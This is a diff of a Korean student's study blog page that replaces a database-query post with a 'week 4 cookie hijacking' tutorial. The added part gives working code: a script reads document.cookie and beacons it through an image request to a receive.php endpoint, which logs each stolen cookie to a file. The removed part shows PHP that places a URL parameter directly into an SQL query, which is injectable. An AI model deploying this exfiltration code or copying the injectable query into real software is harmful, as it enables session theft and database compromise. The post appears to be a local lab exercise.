@@ -9,8 +9,8 @@
   <head>
     <meta charset="utf-8">
 
-<!-- begin _includes/seo.html --><title>2주차 DB연결해서 웹으로 데이터보기 | 나의 코딩 공부</title>
-<meta name="description" content="1. 코딩 작성 및 결과">
+<!-- begin _includes/seo.html --><title>4주차 쿠키 탈취 만들기 | 나의 코딩 공부</title>
+<meta name="description" content="">
 
 
   <meta name="author" content="ethan">
@@ -22,30 +22,30 @@
 <meta property="og:type" content="article">
 <meta property="og:locale" content="ko_KR">
 <meta property="og:site_name" content="나의 코딩 공부">
-<meta property="og:title" content="2주차 DB연결해서 웹으로 데이터보기">
-<meta property="og:url" content="http://localhost:4000/project/Project2/">
+<meta property="og:title" content="4주차 쿠키 탈취 만들기">
+<meta property="og:url" content="http://localhost:4000/project/Project6/">
 
 
-  <meta property="og:description" content="1. 코딩 작성 및 결과">
-
-
-
-
-
-
-
-  <meta property="article:published_time" content="2024-04-27T00:00:00+09:00">
+  <meta property="og:description" content="">
 
 
 
 
 
-  
+
+
+  <meta property="article:published_time" content="2024-05-14T00:00:00+09:00">
+
+
+
+
 
   
 
+  
 
-<link rel="canonical" href="http://localhost:4000/project/Project2/">
+
+<link rel="canonical" href="http://localhost:4000/project/Project6/">
 
 
 
@@ -172,7 +172,7 @@
     
       
       
-        <li class="current">2주차 DB연결해서 웹으로 데이터보기</li>
+        <li class="current">4주차 쿠키 탈취 만들기</li>
       
     
   </ol>
@@ -186,16 +186,16 @@
 
 
   <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
-    <meta itemprop="headline" content="2주차 DB연결해서 웹으로 데이터보기">
-    <meta itemprop="description" content="1. 코딩 작성 및 결과">
-    <meta itemprop="datePublished" content="2024-04-27T00:00:00+09:00">
+    <meta itemprop="headline" content="4주차 쿠키 탈취 만들기">
+    <meta itemprop="description" content="">
+    <meta itemprop="datePublished" content="2024-05-14T00:00:00+09:00">
     
 
     <div class="page__inner-wrap">
       
         <header>
           <h1 id="page-title" class="page__title p-name" itemprop="headline">
-            <a href="http://localhost:4000/project/Project2/" class="u-url" itemprop="url">2주차 DB연결해서 웹으로 데이터보기
+            <a href="http://localhost:4000/project/Project6/" class="u-url" itemprop="url">4주차 쿠키 탈취 만들기
 </a>
           </h1>
           
@@ -206,7 +206,7 @@
       <span class="page__meta-date">
         <i class="far fa-calendar-alt" aria-hidden="true"></i>
         
-        <time datetime="2024-04-27T00:00:00+09:00">2024-04-27</time>
+        <time datetime="2024-05-14T00:00:00+09:00">2024-05-14</time>
       </span>
     
 
@@ -234,31 +234,65 @@
           <aside class="sidebar__right sticky">
             <nav class="toc">
               <header><h4 class="nav__title"><i class="fas fa-fas fa-laptop-code"></i> 목차</h4></header>
-              <ul class="toc__menu"><li><a href="#1-코딩-작성-및-결과">1. 코딩 작성 및 결과</a></li></ul>
+              <ul class="toc__menu"><li><a href="#1쿠키-탈취-만들기">1.쿠키 탈취 만들기</a><ul><li><a href="#11-cookie-hijackinghtml">1.1 Cookie Hijacking.html</a></li><li><a href="#12-cookie-hijackingjs">1.2 Cookie Hijacking.js</a></li><li><a href="#11-receivephp">1.1 receive.php</a></li></ul></li></ul>
 
             </nav>
           </aside>
         
-        <h1 id="1-코딩-작성-및-결과"><span style="background:#000000; color:#ffffff">1. 코딩 작성 및 결과</span></h1>
+        <p><br /></p>
 
-<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
-		<span class="c1">#DB연결</span>
-        <span class="nv">$db_conn</span> <span class="o">=</span> <span class="nb">mysqli_connect</span><span class="p">(</span><span class="s1">'localhost'</span><span class="p">,</span><span class="s1">'admin'</span><span class="p">,</span><span class="s1">'student1234'</span><span class="p">,</span><span class="s1">'test'</span><span class="p">);</span>
-		
-		<span class="c1">#url에 적은 name값 변수에 지정</span>
-        <span class="nv">$name</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+<h1 id="1쿠키-탈취-만들기"><span style="background:#000000; color:#ffffff">1.쿠키 탈취 만들기</span></h1>
 
-		<span class="c1">#변수 name에 해당하는 score값 웹 화면에 띄우기</span>
-        <span class="nv">$sql</span><span class="o">=</span><span class="s2">"select SCORE from test_table WHERE NAME='</span><span class="nv">$name</span><span class="s2">'"</span><span class="p">;</span>
-        <span class="nv">$result</span><span class="o">=</span><span class="nf">mysqli_query</span><span class="p">(</span><span class="nv">$db_conn</span><span class="p">,</span><span class="nv">$sql</span><span class="p">);</span>
-        <span class="nv">$row</span><span class="o">=</span><span class="nf">mysqli_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
-        <span class="k">echo</span> <span class="nv">$name</span><span class="mf">.</span><span class="s2">"학생의 점수는"</span><span class="mf">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'SCORE'</span><span class="p">]</span><span class="mf">.</span><span class="s2">"입니다."</span><span class="p">;</span>
-<span class="cp">?&gt;</span>
+<p><br /></p>
+
+<p>http상태 200 으로 양호하고, user = normaltic 이라는 쿠키를 담고 있습니다. 이 쿠키를 탈취해봅시다.</p>
+
+<p><img src="/images/2024-05-14-Project6/image-20240514195031752.png" alt="image-20240514195031752" /></p>
+
+<h2 id="11-cookie-hijackinghtml">1.1 Cookie Hijacking.html</h2>
+
+<p><br /></p>
+
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
+<span class="nt">&lt;head&gt;</span>
+    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;title&gt;</span>Security Test Page<span class="nt">&lt;/title&gt;</span>
+<span class="nt">&lt;/head&gt;</span>
+<span class="nt">&lt;body&gt;</span>
+    <span class="nt">&lt;h1&gt;</span>Cookie Hijacking 테스트 하기<span class="nt">&lt;/h1&gt;</span>
+    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"Cookie Hijacking.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 
-<p><img src="/images/2024-04-28-1/image-20240428004752758.png" alt="image-20240428004752758" /></p>
+<h2 id="12-cookie-hijackingjs">1.2 Cookie Hijacking.js</h2>
 
-<p>URL파라미터는 URL에서 ? 다음부터 나오는 값인데, 저는 DB에 name: LEE 가 저장되어 있으므로 name=LEE값을 지정해줬습니다.</p>
+<p><br /></p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>			<span class="err">#</span> <span class="nx">http요청이</span> <span class="nx">완료되었을때</span><span class="p">,</span> <span class="nx">user</span><span class="o">=</span><span class="nx">normaltic이라는</span> <span class="nx">쿠키를</span> <span class="nx">설정하고</span><span class="p">,</span> <span class="nx">서버로</span> <span class="nx">보내기</span>
+    <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">user=normaltic; path=/</span><span class="dl">"</span><span class="p">;</span>
+    <span class="nf">sendDataToServer</span><span class="p">();</span>  
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">sendDataToServer</span><span class="p">()</span> <span class="p">{</span>			<span class="err">#</span> <span class="nx">탈취할</span> <span class="nx">url중</span> <span class="nx">쿠키는</span> <span class="nx">인코딩하여</span><span class="p">,</span><span class="nx">이미지</span> <span class="nx">파일을</span> <span class="nx">불러옵니다</span><span class="p">.</span>
+    <span class="kd">const</span> <span class="nx">cookieData</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">;</span>
+    <span class="kd">const</span> <span class="nx">attackURL</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http://localhost:8080/receive.php?cookie=</span><span class="dl">"</span><span class="p">;</span>
+    <span class="k">new</span> <span class="nc">Image</span><span class="p">().</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">attackURL</span> <span class="o">+</span> <span class="nf">encodeURIComponent</span><span class="p">(</span><span class="nx">cookieData</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>이미지 파일을 불러오는 이유 :  사실 이미지 파일이 없어서 이미지를 불러오는 건 중요한 게 아닙니다. 하지만 url로 요청하게 되면 동시에 get 방식으로 서버에 쿠키 정보를 넘겨주는 역할을 수행하기 때문에 이미지 파일을 불러오는 것 입니다.</p>
+
+<h2 id="11-receivephp">1.1 receive.php</h2>
+
+<p><br /></p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>					<span class="c1"># 쿠기의 정보를 cookies.txt 에 저장하기.</span>
+<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'cookie'</span><span class="p">];</span>
+<span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">'cookies.txt'</span><span class="p">,</span> <span class="nv">$cookie</span> <span class="mf">.</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span> <span class="no">FILE_APPEND</span><span class="p">);</span>
+						<span class="c1">#(파일명, 쿠키정보 .줄바꿈 , 파일 뒤에 정보 계속 추가하기 )</span>
+</code></pre></div></div>
 
 
         
@@ -286,7 +320,7 @@
 
         
 
-  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> 업데이트:</strong> <time class="dt-published" datetime="2024-04-27T00:00:00+09:00">2024-04-27</time></p>
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> 업데이트:</strong> <time class="dt-published" datetime="2024-05-14T00:00:00+09:00">2024-05-14</time></p>
 
       </footer>
 
@@ -295,23 +329,22 @@
     <h4 class="page__share-title">공유하기</h4>
   
 
-  <a href="https://twitter.com/intent/tweet?text=2%EC%A3%BC%EC%B0%A8+DB%EC%97%B0%EA%B2%B0%ED%95%B4%EC%84%9C+%EC%9B%B9%EC%9C%BC%EB%A1%9C+%EB%8D%B0%EC%9D%B4%ED%84%B0%EB%B3%B4%EA%B8%B0%20http%3A%2F%2Flocalhost%3A4000%2Fproject%2FProject2%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
+  <a href="https://twitter.com/intent/tweet?text=4%EC%A3%BC%EC%B0%A8+%EC%BF%A0%ED%82%A4+%ED%83%88%EC%B7%A8+%EB%A7%8C%EB%93%A4%EA%B8%B0%20http%3A%2F%2Flocalhost%3A4000%2Fproject%2FProject6%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Twitter"><i class="fab fa-fw fa-twitter" aria-hidden="true"></i><span> Twitter</span></a>
 
-  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fproject%2FProject2%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
+  <a href="https://www.facebook.com/sharer/sharer.php?u=http%3A%2F%2Flocalhost%3A4000%2Fproject%2FProject6%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 Facebook"><i class="fab fa-fw fa-facebook" aria-hidden="true"></i><span> Facebook</span></a>
 
-  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fproject%2FProject2%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
+  <a href="https://www.linkedin.com/shareArticle?mini=true&url=http%3A%2F%2Flocalhost%3A4000%2Fproject%2FProject6%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="공유하기 LinkedIn"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span> LinkedIn</span></a>
 </section>
 
 
       
   <nav class="pagination">
     
-      <a href="/sql/Sql1/" class="pagination--pager" title="2주차 sql과 mysql사용방법
+      <a href="/project/Project5/" class="pagination--pager" title="4주차 키로거 만들기
 ">이전</a>
     
     
-      <a href="/project/Project3/" class="pagination--pager" title="1주차 로그인페이지 만들기(2)
-">다음</a>
+      <a href="#" class="pagination--pager disabled">다음</a>
     
   </nav>
 
@@ -325,53 +358,6 @@
     <div class="page__related">
       <h2 class="page__related-title">참고</h2>
       <div class="grid__wrapper">
-        
-          
-
-
-
-<div class="grid__item">
-  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
-    
-    <h2 class="archive__item-title no_toc" itemprop="headline">
-      
-        <a href="/project/Project6/" rel="permalink">4주차 쿠키 탈취 만들기
-</a>
-      
-    </h2>
-    
-
-  <p class="page__meta">
-    
-      
-      <span class="page__meta-date">
-        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
-        
-        <time datetime="2024-05-14T00:00:00+09:00">2024-05-14</time>
-      </span>
-    
-
-    <span class="page__meta-sep"></span>
-
-    
-      
-      
-
-      <span class="page__meta-readtime">
-        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
-        
-          최대 1 분 소요
-        
-      </span>
-    
-  </p>
-
-
-    <p class="archive__item-excerpt" itemprop="description">
-</p>
-  </article>
-</div>
-
         
           
 
@@ -454,7 +440,7 @@
       <span class="page__meta-readtime">
         <i class="far fa-fw fa-clock" aria-hidden="true"></i>
         
-          1 분 소요
+          3 분 소요
         
       </span>
     
@@ -514,6 +500,53 @@
 </div>
 
         
+          
+
+
+
+<div class="grid__item">
+  <article class="archive__item" itemscope itemtype="https://schema.org/CreativeWork">
+    
+    <h2 class="archive__item-title no_toc" itemprop="headline">
+      
+        <a href="/web/WEB2/" rel="permalink">로그인의 식별과 인증 및 유지
+</a>
+      
+    </h2>
+    
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-fw fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-05-03T00:00:00+09:00">2024-05-03</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-fw fa-clock" aria-hidden="true"></i>
+        
+          1 분 소요
+        
+      </span>
+    
+  </p>
+
+
+    <p class="archive__item-excerpt" itemprop="description">
+</p>
+  </article>
+</div>
+
+        
       </div>
     </div>
   
@@ -560,8 +593,8 @@
     
   <script>
     var disqus_config = function () {
-      this.page.url = "http://localhost:4000/project/Project2/";  /* Replace PAGE_URL with your page's canonical URL variable */
-      this.page.identifier = "/project/Project2"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
+      this.page.url = "http://localhost:4000/project/Project6/";  /* Replace PAGE_URL with your page's canonical URL variable */
+      this.page.identifier = "/project/Project6"; /* Replace PAGE_IDENTIFIER with your page's unique identifier variable */
     };
     (function() { /* DON'T EDIT BELOW THIS LINE */
       var d = document, s = d.createElement('script');
